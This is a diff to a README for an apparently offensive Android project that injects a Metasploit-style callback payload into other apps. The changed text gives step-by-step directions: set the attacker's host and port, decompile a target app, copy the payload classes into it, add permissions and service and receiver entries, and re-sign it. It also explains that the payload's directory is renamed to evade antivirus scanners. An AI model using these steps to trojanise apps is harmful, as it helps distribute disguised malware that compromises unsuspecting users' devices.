@@ -25,11 +25,11 @@ In this two cases, there is a check about the connection:
 ```
 Modify attacker's host and port in the /app/src/main/java/livingbox/Connect.java(String URL line), decompile the app we want to insert the code, 
 copy all the files in /app/src/main/java/livingbox/ to the original app decompiled folder, in /smali/livingbox (new folder).
-After all, modify the original AndroidManifest adding the missing permission and the rest of the lines wrote in this project's AndroidManifest.
+After all, modify the original AndroidManifest adding the missing permission and the rest of the lines about service and receiver wrote in this project's AndroidManifest.
 Rebuild the original app and sign it!
 ```
 
-**I've used this directory instead of /stage/metasploit/com/ just because the most of the "antivirus" and malware scanner check this path.**  recommend to modify the "livingbox" directory and the classes file's (also inside them) to not became so prevedible.
+**I've used "livingbox" directory instead of /stage/metasploit/com/ just because the most of the "antivirus" and malware scanner check this path.**  I recommend to rename the "livingbox" and the classes file's (also inside them) to not became so prevedible.
 
 
 ## Use it at your own risk
